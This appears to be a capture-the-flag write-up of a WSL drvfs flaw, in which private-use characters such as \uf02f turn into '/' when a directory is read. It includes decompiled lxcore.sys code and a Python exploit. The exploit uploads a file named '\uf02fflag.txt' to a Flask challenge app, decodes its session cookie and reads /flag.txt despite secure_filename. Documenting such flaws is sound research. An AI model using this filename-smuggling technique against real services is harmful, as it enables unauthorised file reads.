## Intro & Vulnerability

I use WSL. Someday I created a file named ':', in /mnt/c/Users/\<username\>. Surprisingly it worked. Outside, a file with a strange space in the name is created.

```
$ touch ":"

$ ls -al
total 0
drwxrwxrwx 1 jinmo jinmo 512 Jun 21 17:39 .
drwxrwxrwx 1 jinmo jinmo 512 Jun 21 17:39 ..
-rwxrwxrwx 1 jinmo jinmo   0 Jun 21 17:39 :

$ cmd.exe /c dir
 Volume in drive C has no label.
 Volume Serial Number is 7E37-D379

 Directory of C:\Users\<username>\test

2019-06-21  05:39 PM    <DIR>          .
2019-06-21  05:39 PM    <DIR>          ..
2019-06-21  05:39 PM                 0 
               1 File(s)              0 bytes
               2 Dir(s)               0 bytes free
```

According to python console, the character above is `\uf03a`. The ASCII code of ':' is 0x3a, so I could guess that `\uf02f` may work.

```
$ python
>>> open(u"\uf02fyey", "wb")
>>> exit()

$ ls -al
ls: cannot access '/yey': No such file or directory
total 0
drwxrwxrwx 1 jinmo jinmo 512 Jun 21 17:45 .
drwxrwxrwx 1 jinmo jinmo 512 Jun 21 17:39 ..
-????????? ? ?     ?       ?            ? /yey

$ mount
...
C:\ on /mnt/c type 9p (rw,noatime,sync,dirsync,aname=drvfs;path=C:\;...)
```

Oops. Mount shows that it's mounted with "drvfs" file system. In WSL1, it showed `/mnt/c type drvfs`.

I grepped "drvfs" in System32 folder. In LxUtilFsReadDir (lxcore.sys):

```c
j = 0i64;
remain = size;
do
{
    c = filename[j] - 0xF000;
    if ( c > 0xFFu )
        needs_unescape = 0;
    else
        needs_unescape = LxUtilpNtPathCharNeedsEscape(c);
/*
Escaped / unescaped characters: ['\x00'~'\x1f', '"', '*', '/', '<', '>', '?', '\\', '|'], and ':'.
*/
    if ( needs_unescape )
        filename[j] = c;
    ++j;
    --remain;
}
while ( remain );
```

So relying on readdir in drvfs is dangerous, currently. I'm gonna report this.

## Exploit

```python
import requests
import json
import base64

sess = requests.Session()
host = 'http://0e1.kr:10000'

# Upload a file
sess.post(host+'/post',
          files={'a': (u'\uf02fflag.txt', 'a')}, allow_redirects=False)

# Refresh session cookie to get file identifier
sess.post(host+'/post', allow_redirects=False)

# By default, session cookie is decodable in Flask
session = sess.cookies['session'].split('.')[1]+'=='
session = base64.urlsafe_b64decode(session)
session = json.loads(session.decode('zlib'))

files = session['files']

# ... and magic!
print sess.get(host+'/read/'+files.keys()[0]).content
```

`os.listdir` returns ['/flag.txt'], and `secure_filename` doesn't filter `\uf0xx`.

